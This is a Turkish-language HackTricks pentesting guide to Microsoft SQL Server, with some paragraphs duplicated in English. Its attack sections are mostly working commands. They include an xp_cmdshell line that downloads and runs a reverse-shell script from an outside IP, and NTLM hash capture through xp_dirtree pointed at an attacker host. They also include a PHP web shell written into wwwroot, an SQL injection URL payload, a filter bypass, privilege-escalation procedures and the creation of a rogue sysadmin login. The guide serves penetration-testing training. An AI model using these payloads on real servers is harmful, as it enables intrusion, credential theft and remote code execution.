# 1433 - MSSQL Pentesting - Microsoft SQL Server

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramanla öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli olan zayıflıkları bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Temel Bilgiler

[wikipedia](https://en.wikipedia.org/wiki/Microsoft\_SQL\_Server)'dan:

> **Microsoft SQL Server**, Microsoft tarafından geliştirilen bir **ilişkisel veritabanı** yönetim sistemidir. Bir veritabanı sunucusu olarak, diğer yazılım uygulamalarının talep ettiği şekilde veri depolama ve geri alma işlevini yerine getiren bir yazılım ürünüdür - aynı bilgisayarda veya ağ üzerindeki başka bir bilgisayarda (İnternet dahil) çalışabilir.

**Varsayılan port:** 1433
```
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
```
### **Varsayılan MS-SQL Sistem Tabloları**

* **master Veritabanı**: Bu veritabanı, bir SQL Server örneği için tüm sistem düzeyi ayrıntıları yakalar ve önemlidir.
* **msdb Veritabanı**: SQL Server Agent, uyarılar ve işler için zamanlama yönetimi yapmak için bu veritabanını kullanır.
* **model Veritabanı**: SQL Server örneğindeki her yeni veritabanı için bir taslak olarak işlev görür, burada boyut, sıralama, kurtarma modeli ve daha fazlası gibi herhangi bir değişiklik yeni oluşturulan veritabanlarında yansıtılır.
* **Resource Veritabanı**: SQL Server ile birlikte gelen sistem nesnelerini barındıran salt okunur bir veritabanıdır. Bu nesneler, fiziksel olarak Resource veritabanında depolanırken, mantıksal olarak her veritabanının sys şemasında sunulur.
* **tempdb Veritabanı**: Geçici nesnelerin veya ara sonuç kümesinin depolandığı geçici bir depolama alanı olarak hizmet verir.


## Numaralandırma

### Otomatik Numaralandırma

Eğer hizmet hakkında hiçbir şey bilmiyorsanız:
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
msf> use auxiliary/scanner/mssql/mssql_ping
```
{% hint style="info" %}
Eğer **kimlik bilgileriniz yoksa**, onları tahmin etmeye çalışabilirsiniz. Nmap veya Metasploit'i kullanabilirsiniz. Dikkatli olun, mevcut bir kullanıcı adı kullanarak birkaç kez giriş yapamazsanız hesapları **engelleyebilirsiniz**.
{% endhint %}

#### Metasploit (kimlik bilgileri gereklidir)
```bash
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```
### [**Brute force**](../../generic-methodologies-and-resources/brute-force.md#sql-server)

### El ile Numaralandırma

#### Giriş
```bash
# Using Impacket mssqlclient.py
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# Using sqsh
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
## In case Windows Auth using "." as domain name for local user
sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
## In sqsh you need to use GO after writting the query to send it
1> select 1;
2> go
```
#### Ortak Sıralama

##### MSSQL Server Version Enumeration
##### MSSQL Sunucu Sürüm Sıralaması

To determine the version of the MSSQL server, you can use the following methods:

MSSQL sunucu sürümünü belirlemek için aşağıdaki yöntemleri kullanabilirsiniz:

- **Banner Grabbing**: Connect to the MSSQL server using a tool like `nc` or `telnet` and check the banner response for version information.

  **Banner Yakalama**: `nc` veya `telnet` gibi bir araç kullanarak MSSQL sunucusuna bağlanın ve sürüm bilgisi için banner yanıtını kontrol edin.

- **SQL Query**: Execute a SQL query to retrieve the version information. For example, you can use the following query: `SELECT @@VERSION`.

  **SQL Sorgusu**: Sürüm bilgisini almak için bir SQL sorgusu çalıştırın. Örneğin, aşağıdaki sorguyu kullanabilirsiniz: `SELECT @@VERSION`.

- **Error Messages**: Trigger an error condition and analyze the error message to extract version information. For example, you can intentionally cause a syntax error and observe the error message that includes the version details.

  **Hata Mesajları**: Bir hata durumu tetikleyin ve hata mesajını analiz ederek sürüm bilgisini çıkarın. Örneğin, kasıtlı olarak bir sözdizimi hatası oluşturabilir ve sürüm ayrıntılarını içeren hata mesajını gözlemleyebilirsiniz.

##### MSSQL Server Service Enumeration
##### MSSQL Sunucu Hizmeti Sıralaması

To enumerate the MSSQL server services, you can use the following methods:

MSSQL sunucu hizmetlerini sıralamak için aşağıdaki yöntemleri kullanabilirsiniz:

- **Port Scanning**: Scan the target system for open ports using tools like `nmap` or `masscan`. Look for ports commonly associated with MSSQL, such as 1433 or 1434.

  **Port Taraması**: `nmap` veya `masscan` gibi araçlar kullanarak hedef sistemi açık portlar için tarayın. 1433 veya 1434 gibi MSSQL ile ilişkilendirilen yaygın portları arayın.

- **Banner Grabbing**: Connect to the MSSQL server using a tool like `nc` or `telnet` and check the banner response for service information.

  **Banner Yakalama**: `nc` veya `telnet` gibi bir araç kullanarak MSSQL sunucusuna bağlanın ve hizmet bilgisi için banner yanıtını kontrol edin.

- **Service Scanning**: Use tools like `nmap` or `Metasploit` to perform service scanning and identify the MSSQL server.

  **Hizmet Taraması**: `nmap` veya `Metasploit` gibi araçları kullanarak hizmet taraması yapın ve MSSQL sunucusunu belirleyin.

##### MSSQL Server User Enumeration
##### MSSQL Sunucu Kullanıcı Sıralaması

To enumerate the users in the MSSQL server, you can use the following methods:

MSSQL sunucusundaki kullanıcıları sıralamak için aşağıdaki yöntemleri kullanabilirsiniz:

- **SQL Query**: Execute a SQL query to retrieve the user information. For example, you can use the following query: `SELECT name FROM sys.syslogins`.

  **SQL Sorgusu**: Kullanıcı bilgilerini almak için bir SQL sorgusu çalıştırın. Örneğin, aşağıdaki sorguyu kullanabilirsiniz: `SELECT name FROM sys.syslogins`.

- **Brute Forcing**: Attempt to guess or crack the passwords of existing users using tools like `Hydra` or `Medusa`.

  **Brute Force**: `Hydra` veya `Medusa` gibi araçlar kullanarak mevcut kullanıcıların şifrelerini tahmin etmeye veya kırmaya çalışın.

- **Default Accounts**: Check for default accounts that may exist in the MSSQL server, such as `sa` or `admin`.

  **Varsayılan Hesaplar**: MSSQL sunucusunda var olabilecek varsayılan hesapları kontrol edin, örneğin `sa` veya `admin`.

##### MSSQL Server Database Enumeration
##### MSSQL Sunucu Veritabanı Sıralaması

To enumerate the databases in the MSSQL server, you can use the following methods:

MSSQL sunucusundaki veritabanlarını sıralamak için aşağıdaki yöntemleri kullanabilirsiniz:

- **SQL Query**: Execute a SQL query to retrieve the database information. For example, you can use the following query: `SELECT name FROM sys.databases`.

  **SQL Sorgusu**: Veritabanı bilgilerini almak için bir SQL sorgusu çalıştırın. Örneğin, aşağıdaki sorguyu kullanabilirsiniz: `SELECT name FROM sys.databases`.

- **Default Databases**: Check for default databases that may exist in the MSSQL server, such as `master` or `tempdb`.

  **Varsayılan Veritabanları**: MSSQL sunucusunda var olabilecek varsayılan veritabanlarını kontrol edin, örneğin `master` veya `tempdb`.

- **Error-Based Techniques**: Trigger an error condition and analyze the error message to extract database information. For example, you can intentionally cause a SQL syntax error and observe the error message that includes the database details.

  **Hata Temelli Teknikler**: Bir hata durumu tetikleyin ve hata mesajını analiz ederek veritabanı bilgilerini çıkarın. Örneğin, kasıtlı olarak bir SQL sözdizimi hatası oluşturabilir ve veritabanı ayrıntılarını içeren hata mesajını gözlemleyebilirsiniz.
```sql
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
```
#### Kullanıcıyı Elde Et

{% content-ref url="types-of-mssql-users.md" %}
[types-of-mssql-users.md](types-of-mssql-users.md)
{% endcontent-ref %}
```sql
# Get all the users and roles
select * from sys.database_principals;
## This query filters a bit the results
select name,
create_date,
modify_date,
type_desc as type,
authentication_type_desc as authentication_type,
sid
from sys.database_principals
where type not in ('A', 'R')
order by name;

## Both of these select all the users of the current database (not the server).
## Interesting when you cannot acces the table sys.database_principals
EXEC sp_helpuser
SELECT * FROM sysusers
```
#### İzinleri Almak

1. **Güvenlik:** SQL Server tarafından erişim kontrolü için yönetilen kaynaklar olarak tanımlanır. Bunlar şu şekilde kategorilere ayrılır:
- **Sunucu** - Örnekler arasında veritabanları, girişler, uç noktalar, kullanılabilirlik grupları ve sunucu rolleri bulunur.
- **Veritabanı** - Örnekler arasında veritabanı rolü, uygulama rolleri, şema, sertifikalar, tam metin katalogları ve kullanıcılar bulunur.
- **Şema** - Tablolar, görünümler, prosedürler, fonksiyonlar, eşanlamlılar vb. içerir.

2. **İzin:** SQL Server güvenlikleriyle ilişkilendirilen ALTER, CONTROL ve CREATE gibi izinler, bir prensibe verilebilir. İzinlerin yönetimi iki seviyede gerçekleşir:
- **Sunucu Düzeyi** - Girişler kullanılarak yapılır.
- **Veritabanı Düzeyi** - Kullanıcılar kullanılarak yapılır.

3. **Prensipal:** Bu terim, bir güvenliğe izin verilen varlık anlamına gelir. Prensipaller genellikle girişler ve veritabanı kullanıcıları içerir. Güvenliklere erişim kontrolü, izinlerin verilmesi veya reddedilmesi veya girişlerin ve kullanıcıların erişim haklarına sahip rollerde yer almalarıyla sağlanır.
```sql
# Show all different securables names
SELECT distinct class_desc FROM sys.fn_builtin_permissions(DEFAULT);
# Show all possible permissions in MSSQL
SELECT * FROM sys.fn_builtin_permissions(DEFAULT);
# Get all my permissions over securable type SERVER
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
# Get all my permissions over a database
USE <database>
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
# Get members of the role "sysadmin"
Use master
EXEC sp_helpsrvrolemember 'sysadmin';
# Get if the current user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
# Get users that can run xp_cmdshell
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
## Hileler

### İşletim Sistemi Komutları Çalıştırma

{% hint style="danger" %}
Komutları çalıştırabilmek için **`xp_cmdshell`**'in **etkinleştirilmiş** olması yeterli değildir, aynı zamanda **`xp_cmdshell`** depolanan prosedürüne **EXECUTE iznine** sahip olmanız gerekmektedir. **`xp_cmdshell`**'i kimlerin (sysadminler hariç) kullanabileceğini aşağıdaki komutla öğrenebilirsiniz:
```sql
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
{% endhint %}
```bash
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

#One liner
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
# Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' —
```
### NetNTLM hash çalma / Relay saldırısı

Kimlik doğrulamada kullanılan hash'i yakalamak için bir **SMB sunucusu** başlatmalısınız (`impacket-smbserver` veya `responder` örneğin).
```bash
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# Capture hash
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
```
{% hint style="warning" %}
Bu MSSQL fonksiyonlarını çalıştırma iznine sahip olan kişileri (sistem yöneticileri dışında) kontrol edebilirsiniz:
```sql
Use master;
EXEC sp_helprotect 'xp_dirtree';
EXEC sp_helprotect 'xp_subdirs';
EXEC sp_helprotect 'xp_fileexist';
```
{% endhint %}

**responder** veya **Inveigh** gibi araçlar kullanarak **NetNTLM hash'ini çalmak** mümkündür. Bu araçları nasıl kullanacağınızı aşağıdaki bağlantıda görebilirsiniz:

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

### MSSQL güvenilir Bağlantıları Kötüye Kullanma

Bu özelliği nasıl kötüye kullanacağınız hakkında daha fazla bilgi için [**bu yazıyı okuyun**](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md):

{% content-ref url="../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md" %}
[abusing-ad-mssql.md](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md)
{% endcontent-ref %}

### **Dosya Yazma**

`MSSQL` kullanarak dosya yazmak için, yönetici ayrıcalıklarına sahip olmanız gereken [**Ole Automation Procedures**](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option)'ı etkinleştirmeniz ve ardından dosyayı oluşturmak için bazı depolanan prosedürleri çalıştırmanız gerekmektedir.
```bash
# Enable Ole Automation Procedures
sp_configure 'show advanced options', 1
RECONFIGURE

sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

# Create a File
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```
### **OPENROWSET ile dosya okuma**

Varsayılan olarak, `MSSQL`, hesabın okuma erişimine sahip olduğu işletim sistemindeki herhangi bir dosyayı okumaya izin verir. Aşağıdaki SQL sorgusunu kullanabiliriz:
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```
Ancak, **`BULK`** seçeneği **`ADMINISTER BULK OPERATIONS`** veya **`ADMINISTER DATABASE BULK OPERATIONS`** iznini gerektirir.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
```
#### SQLi için Hata Tabanlı Vektör:

```sql
SELECT * FROM table WHERE column = 'value' AND 1/0
```

Bu SQL ifadesi, hata tabanlı bir SQL enjeksiyonu (SQLi) saldırısı için kullanılabilir. `'value'` yerine hedeflenen sütunun değeri girilir. `1/0` ifadesi, bir bölme işlemi hatası oluşturarak SQL hatası tetikler. Bu, hedef veritabanında hata mesajlarının döndürülmesine neden olabilir ve saldırganın hedef sistem hakkında bilgi toplamasına yardımcı olabilir.
```
https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))--
```
### **RCE/Dosya okuma ve betik çalıştırma (Python ve R)**

MSSQL, **Python ve/veya R ile betikleri** çalıştırmanıza izin verebilir. Bu kodlar, komutları çalıştırmak için **xp\_cmdshell** kullanan kullanıcıdan **farklı bir kullanıcı** tarafından çalıştırılır.

**Çalışmayan** bir **'R'** _"Merhaba Dünya!"_ örneği:

![](<../../.gitbook/assets/image (185) (1).png>)

Çeşitli işlemler gerçekleştirmek için yapılandırılmış python kullanarak örnek:
```sql
# Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```
### Kayıt Defterini Okuma

Microsoft SQL Server, sadece ağla değil aynı zamanda [**Windows Kayıt Defteri**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/) ile de etkileşimde bulunmanıza izin veren **çoklu genişletilmiş saklı prosedürler** sağlar:

| **Normal**                  | **Örnek Duyarlı**                     |
| ---------------------------- | -------------------------------------- |
| sys.xp\_regread              | sys.xp\_instance\_regread              |
| sys.xp\_regenumvalues        | sys.xp\_instance\_regenumvalues        |
| sys.xp\_regenumkeys          | sys.xp\_instance\_regenumkeys          |
| sys.xp\_regwrite             | sys.xp\_instance\_regwrite             |
| sys.xp\_regdeletevalue       | sys.xp\_instance\_regdeletevalue       |
| sys.xp\_regdeletekey         | sys.xp\_instance\_regdeletekey         |
| sys.xp\_regaddmultistring    | sys.xp\_instance\_regaddmultistring    |
| sys.xp\_regremovemultistring | sys.xp\_instance\_regremovemultistring |
```sql
# Example read registry
EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Microsoft SQL Server\MSSQL12.SQL2014\SQLServerAgent', 'WorkingDirectory';
# Example write and then read registry
EXECUTE master.sys.xp_instance_regwrite 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue', 'REG_SZ', 'Now you see me!';
EXECUTE master.sys.xp_instance_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue';
# Example to check who can use these functions
Use master;
EXEC sp_helprotect 'xp_regread';
EXEC sp_helprotect 'xp_regwrite';
```
**Daha fazla örnek** için [**orijinal kaynağa**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/) bakın.

### MSSQL Kullanıcı Tanımlı Fonksiyon ile RCE - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Özel fonksiyonlarla birlikte MSSQL içinde bir .NET dll yüklemek mümkündür. Bunun için, **`dbo` erişimi gereklidir**, bu yüzden veritabanına **`sa` veya Yönetici rolü olarak** bir bağlantıya ihtiyacınız vardır.

Bir örnek için [**bu bağlantıyı takip edin**](../../pentesting-web/sql-injection/mssql-injection.md#mssql-user-defined-function-sqlhttp).

### RCE için Diğer Yöntemler

Komut yürütme elde etmek için diğer yöntemler de vardır, örneğin [genişletilmiş depolanan prosedürler](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assembly'ler](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent İşleri](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15) ve [harici komut dosyaları](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql).

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Önemli olan güvenlik açıklarını bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MSSQL Yetki Yükseltme

### db\_owner'dan sysadmin'e

Eğer bir **normal kullanıcı**, bir **yönetici** kullanıcının sahip olduğu bir veritabanına **`db_owner`** rolü verilirse ve bu veritabanı **`trustworthy`** olarak yapılandırılmışsa, bu kullanıcı bu ayrıcalıkları **yetki yükseltme** için kullanabilir çünkü içinde oluşturulan **depolanmış prosedürler** sahibi (**yönetici**) olarak **çalıştırılabilir**.
```sql
# Get owners of databases
SELECT suser_sname(owner_sid) FROM sys.databases

# Find trustworthy databases
SELECT a.name,b.is_trustworthy_on
FROM master..sysdatabases as a
INNER JOIN sys.databases as b
ON a.name=b.name;

# Get roles over the selected database (look for your username as db_owner)
USE <trustworthy_db>
SELECT rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)

# If you found you are db_owner of a trustworthy database, you can privesc:
--1. Create a stored procedure to add your user to sysadmin role
USE <trustworthy_db>

CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'USERNAME','sysadmin'

--2. Execute stored procedure to get sysadmin role
USE <trustworthy_db>
EXEC sp_elevate_me

--3. Verify your user is a sysadmin
SELECT is_srvrolemember('sysadmin')
```
Aşağıdaki **metasploit** modülünü kullanabilirsiniz:
```bash
msf> use auxiliary/admin/mssql/mssql_escalate_dbowner
```
Ya da bir **PS** betiği:
```powershell
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 10.2.2.184
```
### Diğer kullanıcıların taklit edilmesi

SQL Server'ın **`IMPERSONATE`** adında özel bir izni vardır. Bu izin, **yürütülen kullanıcının başka bir kullanıcının veya oturum açmanın izinlerini almasına** olanak tanır. Bu durum, bağlam sıfırlanana veya oturum sona erene kadar devam eder.
```sql
# Find users you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned

# Impersonate sa user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```
{% hint style="info" %}
Eğer bir kullanıcıyı taklit edebiliyorsanız, o kullanıcının sysadmin olmasa bile diğer veritabanlarına veya bağlantılı sunuculara erişiminin olup olmadığını kontrol etmelisiniz.
{% endhint %}

Unutmayın, bir kez sysadmin olduğunuzda, herhangi bir başkasını taklit edebilirsiniz:
```sql
-- Impersonate RegUser
EXECUTE AS LOGIN = 'RegUser'
-- Verify you are now running as the the MyUser4 login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Change back to sa
REVERT
```
Bu saldırıyı bir **metasploit** modülü ile gerçekleştirebilirsiniz:
```bash
msf> auxiliary/admin/mssql/mssql_escalate_execute_as
```
veya bir **PS** betiği ile:
```powershell
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1
Import-Module .Invoke-SqlServer-Escalate-ExecuteAs.psm1
Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance 10.2.9.101 -SqlUser myuser1 -SqlPass MyPassword!
```
## MSSQL'i Kalıcı Olarak Kullanma

[https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/](https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/)

## SQL Server Linked Sunuculardan Şifreleri Çıkarma
Bir saldırgan, SQL Server Linked Sunucuların şifrelerini SQL Instance'larında saklanan yerlerden çıkarabilir ve bunları açık metin olarak elde ederek hedef üzerinde daha büyük bir etki alanı elde etmek için kullanabilir. 
Linked Sunucular için saklanan ve şifreleri çıkarmak için kullanılan betik [burada](https://www.richardswinbank.net/admin/extract_linked_server_passwords) bulunabilir.

Bu saldırının çalışması için bazı gereksinimler ve yapılandırmalar yapılması gerekmektedir.
Öncelikle, makinede Yönetici haklarına sahip olmanız veya SQL Server Yapılandırmalarını yönetme yeteneğiniz olması gerekmektedir.

İzinlerinizi doğruladıktan sonra, aşağıdaki üç şeyi yapılandırmanız gerekmektedir:
1. SQL Server örneklerinde TCP/IP'yi etkinleştirin;
2. Başlangıç parametresi ekleyin, bu durumda eklenen bir izleme bayrağı olan -T7806 olacaktır.
3. Uzaktan yönetim bağlantısını etkinleştirin.

Bu yapılandırmaları otomatikleştirmek için, [bu depoda](https://github.com/IamLeandrooooo/SQLServerLinkedServersPasswords/) gerekli betikler bulunmaktadır.
Yapılandırma adımlarının her biri için bir powershell betiği bulunan depo, ayrıca yapılandırma betiklerini ve şifrelerin çıkarılması ve şifrelerin çözülmesini birleştiren tam bir betik de içermektedir.

Bu saldırıyla ilgili daha fazla bilgi için aşağıdaki bağlantılara başvurun:
[MSSQL Veritabanı Bağlantı Sunucusu Şifrelerinin Şifrelenmesi](https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-database-link-server-passwords/)

[SQL Server Ayrılmış Yönetici Bağlantısının Sorun Giderilmesi](https://www.mssqltips.com/sqlservertip/5364/troubleshooting-the-sql-server-dedicated-administrator-connection/)

## Yerel İzin Yükseltme

MSSQL sunucusunu çalıştıran kullanıcının etkinleştirilmiş **SeImpersonatePrivilege** ayrıcalık belirteci olacaktır.\
Büyük olasılıkla, aşağıdaki 2 sayfadan birini takip ederek **Yöneticiye yükseltebilirsiniz**:

{% content-ref url="../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](../../windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/windows-local-privilege-escalation/juicypotato.md" %}
[juicypotato.md](../../windows-hardening/windows-local-privilege-escalation/juicypotato.md)
{% endcontent-ref %}

## Shodan

* `port:1433 !HTTP`

## Referanslar

* [https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users](https://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users)
* [https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/](https://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/)
* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
